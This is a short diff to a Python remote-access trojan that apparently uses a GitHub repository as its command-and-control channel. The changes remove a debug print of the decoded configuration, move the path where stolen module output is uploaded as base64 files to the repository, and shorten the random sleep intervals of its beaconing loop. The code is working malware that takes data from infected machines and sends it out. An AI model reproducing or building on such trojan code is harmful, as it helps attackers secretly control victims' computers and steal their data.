@@ -79,7 +79,6 @@ def get_trojan_config():
     global configured
     
     config_json   = get_file_contents(trojan_config)
-    print base64.b64decode(config_json)
     config        = json.loads(base64.b64decode(config_json))
     configured    = True
     
@@ -95,7 +94,7 @@ def store_module_result(data):
     
     gh,repo,branch = connect_to_github()
     
-    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
+    remote_path = "trojan/data/%s/%d.data" % (trojan_id,random.randint(1,10))
                                       
     repo.create_file(remote_path,"Commit message",base64.b64encode(data))
 
@@ -127,5 +126,5 @@ while True:
             t.start()
             time.sleep(random.randint(1,10))
             
-    time.sleep(random.randint(1000,10000))
+    time.sleep(random.randint(1,10))
         
